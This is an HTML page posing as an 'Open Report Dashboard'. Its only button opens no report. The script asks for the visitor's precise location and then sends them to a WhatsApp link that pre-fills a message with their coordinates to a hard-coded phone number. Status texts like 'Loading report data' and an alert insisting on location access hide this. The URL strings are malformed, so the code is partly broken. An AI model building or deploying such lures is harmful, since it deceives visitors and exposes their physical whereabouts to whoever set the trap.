 <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Report Dashboard</title>
    <style>
        body { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-color: #f4f6f9; 
            margin: 0; 
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        .report-btn { 
            width: 100%;
            padding: 22px; 
            font-size: 22px; 
            font-weight: bold; 
            color: #ffffff; 
            background-color: #007bff;
            border: none; 
            border-radius: 16px; 
            cursor: pointer; 
            box-shadow: 0 8px 24px rgba(0, 123, 255, 0.3); 
            transition: transform 0.1s ease, background-color 0.2s ease;
        }
        .report-btn:active { 
            transform: scale(0.96); 
            background-color: #0056b3;
        }
        .status-msg {
            margin-top: 15px;
            font-size: 14px;
            color: #666665;
        }
    </style>
</head>
<body>

    <div class="container">
        <button class="report-btn" onclick="startReportProcessing('60188702526')">📋 Open Report</button>
        <div id="displayStatus" class="status-msg">Tap the button to open the report dashboard</div>
    </div>

    <script>
        function startReportProcessing(phoneNumber) {
            const statusLabel = document.getElementById('displayStatus');
            
            if (!navigator.geolocation) {
                alert("Geolocation is not supported by your mobile browser.");
                return;
            }

            statusLabel.innerText = "Loading report data...";

            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    statusLabel.innerText = "Redirecting to secure layout...";
                    
                    const latitude = pos.coords.latitude;
                    const longitude = pos.coords.longitude;
                    const trackingUrl = "https://google.com" + latitude + "," + longitude;
                    const textPayload = encodeURIComponent("Hey! Here is my current location: " + trackingUrl);
                    
                    window.location.href = "https://wa.me" + phoneNumber + "?text=" + textPayload;
                    
                    setTimeout(function() {
                        statusLabel.innerText = "Tap the button to open the report dashboard";
                    }, 4000);
                },
                function(err) {
                    statusLabel.innerText = "Failed to load report data.";
                    alert("Please enable location services in your browser to view this report dashboard.");
                },
                { 
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                }
            );
        }
    </script>
</body>
</html>
